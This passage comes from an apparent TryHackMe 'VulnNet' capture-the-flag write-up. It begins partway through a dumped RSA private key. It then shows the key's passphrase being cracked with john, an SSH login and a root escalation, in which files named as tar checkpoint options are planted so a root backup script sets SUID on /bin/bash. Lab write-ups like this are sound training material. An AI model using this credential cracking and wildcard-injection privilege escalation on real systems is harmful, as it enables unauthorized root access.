hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----
www-data@vulnnet:/tmp$
```

I tried to access via ssh with the found private key, but it asked for a password, so I had to crack the `id_rsa` file.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ nano id_rsa    
                                                                                                                                             
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ chmod 600 id_rsa                    
                                                                                                                                             
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ssh -i id_rsa server-management@$TARGET
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
```

After converting the hash for `john`, I successfully cracked the `id_rsa` file password.

```
┌──(kali㉿kali)-[~/Downloads/machine]
└─$ ssh2john id_rsa > hash_rsa
                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads/machine]
└─$ john hash_rsa --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
oneTWO3gOyac     (id_rsa)     
1g 0:00:00:00 DONE (2026-11-19 14:27) 1.852g/s 9089Kp/s 9089Kc/s 9089KC/s one_93..one99hugo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I was finally able to access as `server-management` and retrieve the user flag.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ssh -i id_rsa server-management@$TARGET
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

560 packages can be updated.
359 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

server-management@vulnnet:~$ ls -la
total 108
drwxrw---- 18 server-management server-management 4096 Jan 24  2021 .
drwxr-xr-x  3 root              root              4096 Jan 23  2021 ..
lrwxrwxrwx  1 root              root                 9 Jan 23  2021 .bash_history -> /dev/null
-rw-r--r--  1 server-management server-management  220 Jan 23  2021 .bash_logout
-rw-r--r--  1 server-management server-management 3771 Jan 23  2021 .bashrc
drwxrwxr-x  8 server-management server-management 4096 Nov 19 20:28 .cache
drwxrwxr-x 14 server-management server-management 4096 Jan 23  2021 .config
drwx------  3 server-management server-management 4096 Jan 23  2021 .dbus
drwx------  2 server-management server-management 4096 Jan 23  2021 Desktop
-rw-r--r--  1 server-management server-management   26 Jan 23  2021 .dmrc
drwxr-xr-x  2 server-management server-management 4096 Jan 23  2021 Documents
drwxr-xr-x  2 server-management server-management 4096 Jan 23  2021 Downloads
drwx------  3 server-management server-management 4096 Jan 23  2021 .gnupg
drwxrwxr-x  3 server-management server-management 4096 Jan 23  2021 .local
drwx------  5 server-management server-management 4096 Jan 23  2021 .mozilla
drwxr-xr-x  2 server-management server-management 4096 Jan 23  2021 Music
drwxr-xr-x  2 server-management server-management 4096 Jan 23  2021 Pictures
-rw-r--r--  1 server-management server-management  807 Jan 23  2021 .profile
drwxr-xr-x  2 server-management server-management 4096 Jan 23  2021 Public
drwx------  2 server-management server-management 4096 Jan 24  2021 .ssh
-rw-r--r--  1 server-management server-management    0 Jan 23  2021 .sudo_as_admin_successful
drwxr-xr-x  2 server-management server-management 4096 Jan 23  2021 Templates
drwx------  4 server-management server-management 4096 Jan 23  2021 .thumbnails
-rw-------  1 server-management server-management   38 Jan 23  2021 user.txt
drwxr-xr-x  2 server-management server-management 4096 Jan 23  2021 Videos
-rw-------  1 server-management server-management   52 Jan 24  2021 .Xauthority
-rw-r--r--  1 server-management server-management   14 Feb 12  2018 .xscreensaver
-rw-------  1 server-management server-management 2586 Jan 24  2021 .xsession-errors
-rw-------  1 server-management server-management 2586 Jan 23  2021 .xsession-errors.old
server-management@vulnnet:~$ cat user.txt 
THM{REDACTED}
server-management@vulnnet:~$ 
```

At this point, I could access the Documents folder in `server-management` home directory. The script used a `*` wildcard to select all files to backup, and then appended them to the `tar` command.

```
cd /home/server-management/Documents
backup_files="*"

...

tar czf $dest/$archive_file $backup_files
```

In particular, we can abuse the `tar` checkpoint functionality to execute a binary. 

![image.png](/assets/images/thm-vulnnet/image%2010.png)

The idea I had was to create a binary that adds SUID to `/bin/bash`. Because `tar` command ran from backup script, which was executed as `root`, the SUID was added as `root`. 

```
server-management@vulnnet:~/Documents$ echo '#!/bin/bash' > shell
server-management@vulnnet:~/Documents$ echo 'chmod +s /bin/bash' >> shell
server-management@vulnnet:~/Documents$ cat shell
#!/bin/bash
chmod +s /bin/bash
server-management@vulnnet:~/Documents$ chmod +x shell
```

To execute this binary, I had to make the `tar` command use the checkpoint parameters. Because the script uses a `*` wildcard, all I had to do was create 2 files named with the exact parameters I wanted to use.

After about 2 minutes, the `backupsrv.sh` script executed and `/bin/bash` had SUID set as root.

```
server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh shell"
server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
server-management@vulnnet:~/Documents$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
server-management@vulnnet:~/Documents$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
server-management@vulnnet:~/Documents$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt 
THM{REDACTED}
bash-4.4#
```
